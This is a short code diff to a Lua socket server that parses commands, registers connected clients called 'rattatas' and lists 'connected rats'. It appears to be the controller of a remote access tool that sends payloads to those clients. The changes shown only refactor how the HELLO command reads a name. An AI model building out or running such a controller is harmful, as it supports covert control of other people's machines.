@@ -59,7 +59,6 @@ function rattata_handler(skt)
       
       -- say "hi" to add to rattatas list
       elseif command == "HELLO" then
-        -- next line is name
         local name = args[1] or random_string(8)
         rattatas[name] = skt
         skt.rattata = name
@@ -91,7 +90,7 @@ function pakemon_handler(skt)
   local payload = ""
   while true do
     if buffer == nil then
-      local command = copas.receive(skt)
+      local command, args = get_command(copas.receive(skt))
       print("command: " .. command)
       
       -- start a multiline payload
@@ -101,9 +100,9 @@ function pakemon_handler(skt)
       
       -- say "hi" this is mostly for testing
       elseif command == "HELLO" then
-        -- next line is name
-        local name = copas.receive(skt)
+        local name = args[1] or random_string(8)
         copas.send(skt, "HI " .. name)
+      
 
       -- get list of connected rats
       elseif command == "RATTATA_LIST" then
